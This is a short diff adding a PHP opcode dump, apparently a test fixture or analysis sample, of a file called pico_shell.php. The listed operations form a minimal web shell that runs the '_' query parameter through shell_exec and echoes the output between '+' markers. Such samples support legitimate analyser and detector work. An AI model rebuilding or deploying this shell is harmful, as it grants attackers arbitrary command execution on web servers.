@@ -1,0 +1,16 @@
+|filename:|/root/samples/pico_shell.php
+|functionname:|(null)
+|numberofops:|10
+|compiledvars:|none
+|line|#*|||op|fetch|ext|return|operands
+|1|0|E>|ECHO||||'+'|
+||1||INIT_FCALL||||'shell_exec'|
+||2||FETCH_R|global||~0|'_GET'|
+||3||FETCH_DIM_R|||~1|~0|,|'_'|
+||4||CAST||6|~2|~1|
+||5||SEND_VAL||||~2|
+||6||DO_ICALL|||$3|
+||7||ECHO||||$3|
+||8||ECHO||||'+%0A'|
+|2|9|>|RETURN||||1|
+|
